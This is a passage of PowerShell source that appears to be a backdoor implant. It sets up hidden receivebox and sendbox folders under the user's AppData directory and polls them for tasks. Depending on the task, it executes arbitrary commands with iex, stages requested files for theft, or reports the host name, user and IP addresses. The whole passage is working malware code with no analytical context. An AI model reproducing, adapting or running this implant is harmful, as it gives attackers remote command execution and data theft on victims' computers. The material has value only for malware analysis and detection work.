 		if ($cnt -eq 30) 
 		{ 
 			$cnt = 0; 
 			$res += ($p1 + $p2); 
 			$p1 = ""; $p2 = ""; 
 		} 
 		$tmp = [System.BitConverter]::ToString($byte_array[$i]).Replace("-", ""); 
 		$p1 += $tmp[0]; 
 		$p2 += $tmp[1]; 
 		$cnt++; 
 	} 
 	$res += ($p1 + $p2); 
 	return $res; 
 } 
 function processor 
 { 
 	$files_list = @(Get-ChildItem -Path ${global:$receive_box} | Where-Object { !$_.PSIsContainer }); 
 	if ($files_list -ne $null) 
 	{ 
 		$tmpAddress = ${global:$receive_box} + "\" + $files_list[0]; 
 		$newTmpAddress3sss = $tmpAddress -replace "receivebox", "sendbox"; 
 		 
 		if ($tmpAddress.EndsWith("0")) 
 		{ 
 			$file_content = Get-Content $tmpAddress | ? { $_.trim() -ne "" }; 
 			$output_path = ${global:$send_box} + "\" + $files_list[0]; 
 			$file_content = $file_content.Trim(); 
 			($file_content.replace("&", ";") + " 2>&1") | iex | Out-File $output_path -Encoding UTF8 
 			if (Test-Path -Path $tmpAddress) 
 			{ 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 		elseif ($tmpAddress.EndsWith("1")) 
 		{ 
 			$fileAddr2Down = Get-Content $tmpAddress | ? { $_.trim() -ne "" } | %{ $_.Replace("`0", "").Trim() } 
 			if (Test-Path -Path $fileAddr2Down) 
 			{ 
 				$output_path = ${global:$send_box} + "\" + $files_list[0]; 
 				Copy-Item -path $fileAddr2Down -destination $output_path -Force; 
 			} 
 			else 
 			{ 
 				"File not exist" | Set-Content $newTmpAddress3sss; 
 			} 
 			if (Test-Path -Path $tmpAddress) 
 			{ 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 		elseif ($tmpAddress.EndsWith("2")) 
 		{ 
 			$newTmpAddress2 = $tmpAddress -replace "receivebox", "done"; 
 			Move-Item -path $tmpAddress -destination $newTmpAddress2 -Force; 
 			if (Test-Path -Path $newTmpAddress2) 
 			{ 
 				("200<>" + $newTmpAddress2) | Set-Content $newTmpAddress3sss; 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 		elseif ($tmpAddress.EndsWith("3")) 
 		{ 
 			getInfo | Out-File -Encoding 'UTF8' -FilePath "$(${global:$send_box})\00inf"; 
 			if (Test-Path -Path $tmpAddress) 
 			{ 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 	} 
 } 
 function getInfo 
 { 
 	$ip = @(); 
 	Get-WmiObject win32_networkadapterconfiguration | ? { $_.IPAddress -ne $null } | Sort-Object IPAddress -Unique | % { $ip += $_.IPAddress }; 
 	$whoam = "$($env:COMPUTERNAME)/$($env:USERNAME)"; 
 	return "$(${global:$aidsss})<>$($whoam)<>$(([string]::Join(",", $ip)).Trim())<>${global:$myPathsss}"; 
 } 
 if ((Get-WmiObject Win32_Process -Filter ("CommandLine LIKE '%"+$MyInvocation.MyCommand.Name.Trim()+"%'")).length -lt 10) { 
 	${global:$root_path} = $env:APPDATA + "\Windows\Libraries\" + ${global:$aidsss}; 
 	${global:$receive_box} = ${global:$root_path} + "\receivebox"; 
 	${global:$send_box} = ${global:$root_path} + "\sendbox"; 
 	${global:$done_box} = ${global:$root_path} + "\done"; 
 	if (-not (Test-Path -Path ${global:$root_path}) -or -not (Test-Path -Path ${global:$send_box})) 
 	{ 
 		md ${global:$root_path}; 
 		md ${global:$send_box}; 
 		md ${global:$receive_box}; 
 		md ${global:$done_box}; 
 		getInfo; 
 	} 
 	receive; 
 	processor; 
 	send; 
 }
